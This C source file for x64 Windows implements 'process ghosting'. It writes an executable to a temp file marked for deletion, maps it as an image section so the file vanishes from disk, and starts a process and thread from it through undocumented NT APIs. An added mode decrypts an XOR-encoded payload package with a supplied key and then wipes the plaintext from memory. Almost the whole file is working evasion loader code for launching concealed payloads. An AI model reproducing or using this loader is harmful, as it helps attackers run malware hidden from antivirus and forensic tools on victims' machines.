#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <wctype.h>
#include <limits.h>
#include <stdint.h>
#include <windows.h>
#include <winternl.h>

#if !defined(_WIN64) || !(defined(_M_X64) || defined(__x86_64__))
#error This source must be built for x64 Windows.
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef SEC_IMAGE
#define SEC_IMAGE 0x1000000
#endif

#ifndef RTL_USER_PROCESS_PARAMETERS_NORMALIZED
#define RTL_USER_PROCESS_PARAMETERS_NORMALIZED 0x01
#endif

/* x64 PEB offsets */
#define PEB_IMAGEBASE_OFF   0x10
#define PEB_PARAMS_OFF      0x20
#define PARAMS_ENV_OFF      0x80

#define VXOR_HEADER_SIZE 40
#define VXOR_MAX_KEY_SIZE 64
#define VXOR_FNV_OFFSET 1469598103934665603ULL
#define VXOR_FNV_PRIME 1099511628211ULL

/* Minimum process access for ghost injection */
#define GHOST_ACCESS ( \
    PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | \
    PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_TERMINATE | SYNCHRONIZE)

/* --- Undocumented NT API function pointer types --- */

typedef NTSTATUS(NTAPI* pfnNtCreateProcessEx)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle,
    HANDLE DebugPort,
    HANDLE TokenHandle,
    ULONG Reserved);

typedef NTSTATUS(NTAPI* pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle);

typedef NTSTATUS(NTAPI* pfnNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

typedef NTSTATUS(NTAPI* pfnNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList);

typedef NTSTATUS(NTAPI* pfnRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags);

typedef VOID(NTAPI* pfnRtlDestroyProcessParameters)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters);

/* --- Helpers --- */

static SIZE_T GetWideEnvBlockSize(LPCWCH env) {
    LPCWCH p;
    if (!env) return 0;
    if (!*env) return 2 * sizeof(WCHAR);
    p = env;
    while (*p) p += wcslen(p) + 1;
    return ((SIZE_T)(p - env) + 1) * sizeof(WCHAR);
}

static BOOL InitUnicodeString(UNICODE_STRING* result, WCHAR* value) {
    SIZE_T length = wcslen(value);
    if (length >= USHRT_MAX / sizeof(WCHAR)) return FALSE;
    result->Buffer = value;
    result->Length = (USHORT)(length * sizeof(WCHAR));
    result->MaximumLength = (USHORT)((length + 1) * sizeof(WCHAR));
    return TRUE;
}

/* Quote each argument according to the Windows command-line parsing rules. */
static WCHAR* BuildCommandLine(const WCHAR* path, int extraCount, wchar_t** extra) {
    SIZE_T capacity = 1;
    SIZE_T used = 0;
    WCHAR* result;
    int argIndex;

    for (argIndex = -1; argIndex < extraCount; ++argIndex) {
        const WCHAR* arg = argIndex < 0 ? path : extra[argIndex];
        SIZE_T length = wcslen(arg);
        if (capacity > (SIZE_T)-1 - 4 ||
            length > ((SIZE_T)-1 - capacity - 4) / 2) return NULL;
        capacity += length * 2 + 4;
    }
    if (capacity > (SIZE_T)-1 / sizeof(WCHAR)) return NULL;
    result = (WCHAR*)malloc(capacity * sizeof(WCHAR));
    if (!result) return NULL;

    for (argIndex = -1; argIndex < extraCount; ++argIndex) {
        const WCHAR* arg = argIndex < 0 ? path : extra[argIndex];
        SIZE_T slashes = 0;
        if (argIndex >= 0) result[used++] = L' ';
        result[used++] = L'"';
        while (*arg) {
            if (*arg == L'\\') {
                ++slashes;
            } else if (*arg == L'"') {
                while (slashes > 0) {
                    result[used++] = L'\\';
                    result[used++] = L'\\';
                    --slashes;
                }
                result[used++] = L'\\';
                result[used++] = L'"';
            } else {
                while (slashes > 0) {
                    result[used++] = L'\\';
                    --slashes;
                }
                result[used++] = *arg;
            }
            ++arg;
        }
        while (slashes > 0) {
            result[used++] = L'\\';
            result[used++] = L'\\';
            --slashes;
        }
        result[used++] = L'"';
    }
    result[used] = L'\0';
    return result;
}

static void WipeBytes(void* data, SIZE_T size) {
    volatile BYTE* cursor = (volatile BYTE*)data;
    while (size-- > 0) *cursor++ = 0;
}

static int HexNibble(WCHAR digit) {
    if (digit >= L'0' && digit <= L'9') return digit - L'0';
    if (digit >= L'a' && digit <= L'f') return digit - L'a' + 10;
    if (digit >= L'A' && digit <= L'F') return digit - L'A' + 10;
    return -1;
}

static BOOL ParseHexKey(const WCHAR* text, BYTE key[VXOR_MAX_KEY_SIZE], SIZE_T* keySize) {
    SIZE_T digits = 0;
    int high = 0;
    int nibble;
    if (text[0] == L'0' && (text[1] == L'x' || text[1] == L'X')) text += 2;
    while (*text) {
        if (*text == L':' || *text == L'-' || *text == L'_' || iswspace(*text)) {
            ++text;
            continue;
        }
        nibble = HexNibble(*text++);
        if (nibble < 0 || digits >= VXOR_MAX_KEY_SIZE * 2) return FALSE;
        if ((digits & 1) == 0) high = nibble;
        else key[digits / 2] = (BYTE)((high << 4) | nibble);
        ++digits;
    }
    if (!digits || (digits & 1)) return FALSE;
    *keySize = digits / 2;
    return TRUE;
}

static uint64_t ReadU64LE(const BYTE* data) {
    uint64_t value = 0;
    int i;
    for (i = 0; i < 8; ++i) value |= (uint64_t)data[i] << (i * 8);
    return value;
}

static uint64_t Fnv1a64(const BYTE* data, SIZE_T size) {
    uint64_t hash = VXOR_FNV_OFFSET;
    SIZE_T i;
    for (i = 0; i < size; ++i) {
        hash ^= data[i];
        hash *= VXOR_FNV_PRIME;
    }
    return hash;
}

/* Decode the same 40-byte VXOR v1 format written by void-teams/shld/xor.c. */
static BOOL DecodeVxorPackage(const WCHAR* path, const BYTE* key, SIZE_T keySize,
                              PVOID* decoded, DWORD* decodedSize) {
    HANDLE package = INVALID_HANDLE_VALUE;
    LARGE_INTEGER packageSize;
    BYTE header[VXOR_HEADER_SIZE];
    BYTE* bytes = NULL;
    DWORD readCount;
    uint64_t plainSize = 0, plainHash, cipherSize, cipherHash;
    SIZE_T i;
    BOOL success = FALSE;

    *decoded = NULL;
    *decodedSize = 0;
    package = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                          OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (package == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open VXOR package: %lu\n", GetLastError());
        return FALSE;
    }
    if (!GetFileSizeEx(package, &packageSize) ||
        packageSize.QuadPart < VXOR_HEADER_SIZE ||
        !ReadFile(package, header, sizeof(header), &readCount, NULL) ||
        readCount != sizeof(header)) {
        puts("[-] Cannot read VXOR header.");
        goto cleanup_vxor;
    }
    if (memcmp(header, "VXOR", 4) != 0 || header[4] != 1 ||
        header[5] != keySize || header[5] == 0 ||
        header[6] != 0 || header[7] != 0) {
        puts("[-] Invalid VXOR magic, version, flags, or key length.");
        goto cleanup_vxor;
    }
    plainSize = ReadU64LE(header + 8);
    plainHash = ReadU64LE(header + 16);
    cipherSize = ReadU64LE(header + 24);
    cipherHash = ReadU64LE(header + 32);
    if (plainSize != cipherSize || plainSize < sizeof(IMAGE_NT_HEADERS64) ||
        plainSize > MAXDWORD ||
        packageSize.QuadPart != (LONGLONG)(VXOR_HEADER_SIZE + cipherSize)) {
        puts("[-] Invalid VXOR payload size.");
        goto cleanup_vxor;
    }
    bytes = (BYTE*)malloc((SIZE_T)plainSize);
    if (!bytes) {
        puts("[-] VXOR payload allocation failed.");
        goto cleanup_vxor;
    }
    if (!ReadFile(package, bytes, (DWORD)cipherSize, &readCount, NULL) ||
        readCount != cipherSize) {
        puts("[-] Cannot read VXOR payload.");
        goto cleanup_vxor;
    }
    if (Fnv1a64(bytes, (SIZE_T)cipherSize) != cipherHash) {
        puts("[-] VXOR cipher hash verification failed.");
        goto cleanup_vxor;
    }
    for (i = 0; i < (SIZE_T)plainSize; ++i) bytes[i] ^= key[i % keySize];
    if (Fnv1a64(bytes, (SIZE_T)plainSize) != plainHash) {
        puts("[-] VXOR plain hash verification failed (wrong key or corrupt package).");
        goto cleanup_vxor;
    }
    *decoded = bytes;
    *decodedSize = (DWORD)plainSize;
    bytes = NULL;
    success = TRUE;
    printf("[+] VXOR package verified; decoded %lu bytes.\n", *decodedSize);

cleanup_vxor:
    if (bytes) {
        WipeBytes(bytes, (SIZE_T)plainSize);
        free(bytes);
    }
    CloseHandle(package);
    return success;
}

int wmain(int argc, wchar_t* argv[]) {
    /* Variable declarations (C89-compatible block) */
    HMODULE ntdll;
    pfnNtCreateProcessEx    pNtCreateProcessEx;
    pfnNtCreateSection      pNtCreateSection;
    pfnNtQueryInformationProcess pNtQueryInformationProcess;
    pfnNtCreateThreadEx     pNtCreateThreadEx;
    pfnRtlCreateProcessParametersEx pRtlCreatePPEx;
    pfnRtlDestroyProcessParameters  pRtlDestroyPP = NULL;

    WCHAR targetPath[MAX_PATH];
    WCHAR* commandLine = NULL;
    WCHAR* selfArgs[] = { L"--ghost-child" };
    BOOL selfMode = argc == 1;
    BOOL vxorMode = argc >= 2 && wcscmp(argv[1], L"--vxor") == 0;
    BOOL decodedVxor = FALSE;
    BYTE key[VXOR_MAX_KEY_SIZE] = { 0 };
    SIZE_T keySize = 0;
    DWORD pathLength;
    HANDLE hSource = INVALID_HANDLE_VALUE;
    DWORD fileSize = 0, bytesRead, bytesWritten;
    PVOID fileBuf = NULL;
    PIMAGE_DOS_HEADER fileDos;
    PIMAGE_NT_HEADERS64 fileNtHdr;
    LONG ntOffset;
    DWORD entryRva;

    WCHAR tempDir[MAX_PATH], tempFile[MAX_PATH];
    HANDLE hTemp = INVALID_HANDLE_VALUE;
    FILE_DISPOSITION_INFO disp;

    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;
    NTSTATUS status;

    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen = 0;
    PVOID imageBase = NULL;

    IMAGE_DOS_HEADER remoteDos;
    BYTE ntBuf[sizeof(IMAGE_NT_HEADERS64)];
    PIMAGE_NT_HEADERS64 pNtHdr;
    PVOID entryPoint = NULL;

    UNICODE_STRING uImagePath, uCurrentDir, uCmdLine;
    WCHAR workDir[MAX_PATH];
    wchar_t* lastSlash;
    LPWCH envStrings = NULL;
    PRTL_USER_PROCESS_PARAMETERS pParams = NULL;

    SIZE_T paramsSize, envSize;
    PVOID paramsEnv;
    ULONG_PTR allocStart, allocEnd, alignedStart, alignedEnd, granularity;
    SYSTEM_INFO systemInfo;
    PVOID remoteAlloc;
    PVOID remoteParamsPtr;
    DWORD exitCode = 0;
    DWORD waitResult;
    BOOL processExited = FALSE;
    int ret = 1;

    if (argc >= 2 && wcscmp(argv[1], L"--ghost-child") == 0) {
        puts("[+] Ghost child reached wmain.");
        return 0;
    }
    if (vxorMode && argc < 4) {
        wprintf(L"Usage: %ls --vxor <input.vxor> <hex-key> [args...]\n", argv[0]);
        return 2;
    }

    if (selfMode || vxorMode) {
        pathLength = GetModuleFileNameW(NULL, targetPath, MAX_PATH);
        if (!pathLength || pathLength >= MAX_PATH) {
            printf("[-] GetModuleFileNameW failed or path is too long: %lu\n", GetLastError());
            return 1;
        }
        if (selfMode) commandLine = BuildCommandLine(targetPath, 1, selfArgs);
        else commandLine = BuildCommandLine(targetPath, argc - 4, argv + 4);
    } else {
        pathLength = GetFullPathNameW(argv[1], MAX_PATH, targetPath, NULL);
        if (!pathLength || pathLength >= MAX_PATH) {
            printf("[-] GetFullPathNameW failed or path is too long: %lu\n", GetLastError());
            return 1;
        }
        commandLine = BuildCommandLine(targetPath, argc - 2, argv + 2);
    }
    if (!commandLine || wcslen(commandLine) >= USHRT_MAX / sizeof(WCHAR)) {
        puts("[-] Could not build a valid command line.");
        free(commandLine);
        return 1;
    }

    /* ---- Resolve undocumented NT APIs ---- */
    ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] ntdll.dll not found\n");
        goto cleanup;
    }
    pNtCreateProcessEx = (pfnNtCreateProcessEx)GetProcAddress(ntdll, "NtCreateProcessEx");
    pNtCreateSection   = (pfnNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
    pNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    pNtCreateThreadEx  = (pfnNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
    pRtlCreatePPEx     = (pfnRtlCreateProcessParametersEx)GetProcAddress(ntdll, "RtlCreateProcessParametersEx");
    pRtlDestroyPP      = (pfnRtlDestroyProcessParameters)GetProcAddress(ntdll, "RtlDestroyProcessParameters");
    if (!pNtCreateProcessEx || !pNtCreateSection || !pNtQueryInformationProcess ||
        !pNtCreateThreadEx || !pRtlCreatePPEx || !pRtlDestroyPP) {
        printf("[-] Failed to resolve NT APIs\n");
        goto cleanup;
    }

    /* ==== Step 1: Load a plain PE or verify and decode a VXOR package ==== */
    if (vxorMode) {
        if (!ParseHexKey(argv[3], key, &keySize)) {
            puts("[-] VXOR key must contain 1-64 hexadecimal bytes.");
            goto cleanup;
        }
        if (!DecodeVxorPackage(argv[2], key, keySize, &fileBuf, &fileSize))
            goto cleanup;
        decodedVxor = TRUE;
        WipeBytes(key, sizeof(key));
    } else {
        hSource = CreateFileW(targetPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hSource == INVALID_HANDLE_VALUE) {
            printf("[-] Cannot open target PE: %lu\n", GetLastError());
            goto cleanup;
        }

        fileSize = GetFileSize(hSource, NULL);
        if (fileSize == INVALID_FILE_SIZE || fileSize < sizeof(IMAGE_NT_HEADERS64)) {
            printf("[-] Invalid file size\n");
            goto cleanup;
        }

        fileBuf = malloc(fileSize);
        if (!fileBuf) goto cleanup;
        bytesRead = 0;
        if (!ReadFile(hSource, fileBuf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
            printf("[-] ReadFile failed: %lu\n", GetLastError());
            goto cleanup;
        }
        CloseHandle(hSource);
        hSource = INVALID_HANDLE_VALUE;
    }

    /* Reject PE32, ARM64, managed, malformed, and DLL images before creating a section. */
    fileDos = (PIMAGE_DOS_HEADER)fileBuf;
    if (fileDos->e_magic != IMAGE_DOS_SIGNATURE || fileDos->e_lfanew < 0 ||
        (SIZE_T)fileDos->e_lfanew > fileSize - sizeof(IMAGE_NT_HEADERS64)) {
        puts("[-] Invalid PE DOS/NT header bounds.");
        goto cleanup;
    }
    fileNtHdr = (PIMAGE_NT_HEADERS64)((PBYTE)fileBuf + fileDos->e_lfanew);
    if (fileNtHdr->Signature != IMAGE_NT_SIGNATURE ||
        fileNtHdr->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        fileNtHdr->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64) ||
        (fileNtHdr->FileHeader.Characteristics & IMAGE_FILE_DLL) ||
        fileNtHdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        (fileNtHdr->OptionalHeader.NumberOfRvaAndSizes > IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR &&
         fileNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress != 0) ||
        fileNtHdr->OptionalHeader.AddressOfEntryPoint == 0 ||
        fileNtHdr->OptionalHeader.AddressOfEntryPoint >= fileNtHdr->OptionalHeader.SizeOfImage) {
        puts("[-] Target must be a valid native x64 executable.");
        goto cleanup;
    }
    ntOffset = fileDos->e_lfanew;
    entryRva = fileNtHdr->OptionalHeader.AddressOfEntryPoint;

    /* ==== Step 2: Create temp file with DELETE_ON_CLOSE ==== */
    pathLength = GetTempPathW(MAX_PATH, tempDir);
    if (!pathLength || pathLength >= MAX_PATH ||
        !GetTempFileNameW(tempDir, L"GHO", 0, tempFile)) {
        printf("[-] Temp path failed: %lu\n", GetLastError());
        goto cleanup;
    }

    hTemp = CreateFileW(tempFile,
        GENERIC_READ | GENERIC_WRITE | DELETE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hTemp == INVALID_HANDLE_VALUE) {
        printf("[-] CreateFileW(temp) failed: %lu\n", GetLastError());
        DeleteFileW(tempFile);
        goto cleanup;
    }

    /* ==== Step 3: Write PE payload to temp file ==== */
    bytesWritten = 0;
    if (!WriteFile(hTemp, fileBuf, fileSize, &bytesWritten, NULL) || bytesWritten != fileSize) {
        printf("[-] WriteFile(temp) failed: %lu\n", GetLastError());
        goto cleanup;
    }
    if (decodedVxor) WipeBytes(fileBuf, fileSize);
    free(fileBuf);
    fileBuf = NULL;

    /* The section must be created while the delete-pending file handle is open. */
    disp.DeleteFile = TRUE;
    if (!SetFileInformationByHandle(hTemp, FileDispositionInfo, &disp, sizeof(disp))) {
        printf("[-] FileDispositionInfo failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ==== Step 4: Create SEC_IMAGE section from the temp file ==== */
    status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
        PAGE_READONLY, SEC_IMAGE, hTemp);

    /* Close temp handle - file is now deleted from disk ("ghosted") */
    CloseHandle(hTemp);
    hTemp = INVALID_HANDLE_VALUE;

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateSection(SEC_IMAGE) failed: 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }

    /* ==== Step 5: Create process from the ghosted section ==== */
    status = pNtCreateProcessEx(&hProcess, GHOST_ACCESS, NULL,
        GetCurrentProcess(), 0, hSection, NULL, NULL, 0);

    CloseHandle(hSection);
    hSection = NULL;

    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateProcessEx failed: 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }
    printf("[+] Ghost process created (PID: %lu)\n", GetProcessId(hProcess));

    /* ==== Step 6: Query PEB address ==== */
    memset(&pbi, 0, sizeof(pbi));
    status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation,
        &pbi, sizeof(pbi), &retLen);
    if (!NT_SUCCESS(status) || !pbi.PebBaseAddress) {
        printf("[-] NtQueryInformationProcess failed: 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }

    /* ==== Step 7: Read ImageBase from PEB (x64: offset 0x10) ==== */
    if (!ReadProcessMemory(hProcess,
            (PBYTE)pbi.PebBaseAddress + PEB_IMAGEBASE_OFF,
            &imageBase, sizeof(imageBase), NULL) || !imageBase) {
        printf("[-] Failed to read PEB.ImageBase: %lu\n", GetLastError());
        goto cleanup;
    }
    printf("[+] ImageBase: %p\n", imageBase);

    /* ==== Step 8: Parse remote PE headers for entry point ==== */
    if (!ReadProcessMemory(hProcess, imageBase, &remoteDos,
            sizeof(remoteDos), NULL) ||
        remoteDos.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Failed to read remote DOS header: %lu\n", GetLastError());
        goto cleanup;
    }

    memset(ntBuf, 0, sizeof(ntBuf));
    if (remoteDos.e_lfanew != ntOffset ||
        !ReadProcessMemory(hProcess,
            (PBYTE)imageBase + remoteDos.e_lfanew,
            ntBuf, sizeof(ntBuf), NULL)) {
        printf("[-] Failed to read NT headers: %lu\n", GetLastError());
        goto cleanup;
    }

    pNtHdr = (PIMAGE_NT_HEADERS64)ntBuf;
    if (pNtHdr->Signature != IMAGE_NT_SIGNATURE ||
        pNtHdr->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64 ||
        pNtHdr->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC ||
        pNtHdr->OptionalHeader.AddressOfEntryPoint != entryRva ||
        entryRva > (ULONG_PTR)-1 - (ULONG_PTR)imageBase) {
        printf("[-] Remote x64 PE header does not match the source image\n");
        goto cleanup;
    }
    entryPoint = (PVOID)((ULONG_PTR)imageBase + entryRva);
    printf("[+] EntryPoint: %p\n", entryPoint);

    /* ==== Step 9: Set up RTL_USER_PROCESS_PARAMETERS ==== */
    if (wcscpy_s(workDir, MAX_PATH, targetPath)) {
        puts("[-] Could not copy the target path.");
        goto cleanup;
    }
    lastSlash = wcsrchr(workDir, L'\\');
    if (lastSlash) {
        if (lastSlash == workDir + 2 && workDir[1] == L':')
            lastSlash[1] = L'\0';
        else
            *lastSlash = L'\0';
    }
    if (!InitUnicodeString(&uImagePath, targetPath) ||
        !InitUnicodeString(&uCurrentDir, workDir) ||
        !InitUnicodeString(&uCmdLine, commandLine)) {
        puts("[-] Process path or command line is too long.");
        goto cleanup;
    }

    envStrings = GetEnvironmentStringsW();
    if (!envStrings) {
        printf("[-] GetEnvironmentStringsW failed: %lu\n", GetLastError());
        goto cleanup;
    }

    status = pRtlCreatePPEx(&pParams, &uImagePath, NULL, &uCurrentDir,
        &uCmdLine, envStrings, NULL, NULL, NULL, NULL,
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED);
    if (!NT_SUCCESS(status) || !pParams) {
        printf("[-] RtlCreateProcessParametersEx failed: 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }

    /* ==== Step 10: Write process parameters to remote process ==== */
    paramsSize = (SIZE_T)(*(PULONG)((PBYTE)pParams + 4));  /* Length field at offset 4 */
    if (paramsSize < PARAMS_ENV_OFF + sizeof(PVOID)) {
        puts("[-] Process parameter block is too short.");
        goto cleanup;
    }
    paramsEnv  = *(PVOID*)((PBYTE)pParams + PARAMS_ENV_OFF);
    envSize    = GetWideEnvBlockSize((LPCWCH)paramsEnv);

    if (!paramsEnv || !envSize) {
        printf("[-] Process parameters contain no environment block\n");
        goto cleanup;
    }

    if (paramsSize > (ULONG_PTR)-1 - (ULONG_PTR)pParams ||
        envSize > (ULONG_PTR)-1 - (ULONG_PTR)paramsEnv) {
        puts("[-] Process parameter allocation range overflow.");
        goto cleanup;
    }
    allocStart = (ULONG_PTR)pParams;
    allocEnd   = allocStart + paramsSize;
    if ((ULONG_PTR)paramsEnv < allocStart)
        allocStart = (ULONG_PTR)paramsEnv;
    if ((ULONG_PTR)paramsEnv + envSize > allocEnd)
        allocEnd = (ULONG_PTR)paramsEnv + envSize;

    GetSystemInfo(&systemInfo);
    granularity = systemInfo.dwAllocationGranularity;
    if (!granularity || (granularity & (granularity - 1)) ||
        allocEnd > (ULONG_PTR)-1 - (granularity - 1)) {
        puts("[-] Invalid process parameter allocation range.");
        goto cleanup;
    }
    alignedStart = allocStart & ~(granularity - 1);
    alignedEnd = (allocEnd + granularity - 1) & ~(granularity - 1);
    if (alignedEnd <= alignedStart) {
        puts("[-] Invalid aligned process parameter range.");
        goto cleanup;
    }
    remoteAlloc = VirtualAllocEx(hProcess, (PVOID)alignedStart,
        alignedEnd - alignedStart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteAlloc != (PVOID)alignedStart) {
        printf("[-] VirtualAllocEx(params) failed: %lu\n", GetLastError());
        goto cleanup;
    }

    {
        SIZE_T written = 0;
        if (!WriteProcessMemory(hProcess, pParams, pParams, paramsSize, &written) ||
            written != paramsSize ||
            !WriteProcessMemory(hProcess, paramsEnv, paramsEnv, envSize, &written) ||
            written != envSize) {
        printf("[-] WriteProcessMemory(params) failed: %lu\n", GetLastError());
        goto cleanup;
        }
    }

    /* Update PEB.ProcessParameters pointer (x64: offset 0x20) */
    remoteParamsPtr = (PVOID)pParams;
    if (!WriteProcessMemory(hProcess,
            (PBYTE)pbi.PebBaseAddress + PEB_PARAMS_OFF,
            &remoteParamsPtr, sizeof(remoteParamsPtr), NULL)) {
        printf("[-] Failed to write PEB.ProcessParameters: %lu\n", GetLastError());
        goto cleanup;
    }

    /* ==== Step 11: Create thread at entry point ==== */
    status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
        entryPoint, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtCreateThreadEx failed: 0x%08lX\n", (unsigned long)status);
        goto cleanup;
    }

    printf("[+] Ghost process running!\n");

    /* Wait for the ghost process to exit */
    waitResult = WaitForSingleObject(hProcess, selfMode ? 20000 : INFINITE);
    if (waitResult != WAIT_OBJECT_0 || !GetExitCodeProcess(hProcess, &exitCode)) {
        if (waitResult == WAIT_TIMEOUT)
            puts("[-] Ghost process did not exit within 20 seconds.");
        else
            printf("[-] Waiting for ghost process failed: %lu\n", GetLastError());
        goto cleanup;
    }
    processExited = TRUE;
    printf("[+] Ghost process exit code: %lu (0x%08lX)\n", exitCode, exitCode);
    ret = (int)exitCode;

cleanup:
    if (!processExited && hProcess) TerminateProcess(hProcess, 1);
    if (pParams && pRtlDestroyPP) pRtlDestroyPP(pParams);
    if (envStrings) FreeEnvironmentStringsW(envStrings);
    if (hThread)    CloseHandle(hThread);
    if (hProcess)   CloseHandle(hProcess);
    if (hSection)   CloseHandle(hSection);
    if (hTemp != INVALID_HANDLE_VALUE) CloseHandle(hTemp);
    if (hSource != INVALID_HANDLE_VALUE) CloseHandle(hSource);
    if (decodedVxor && fileBuf) WipeBytes(fileBuf, fileSize);
    free(fileBuf);
    WipeBytes(key, sizeof(key));
    free(commandLine);
    return ret;
}
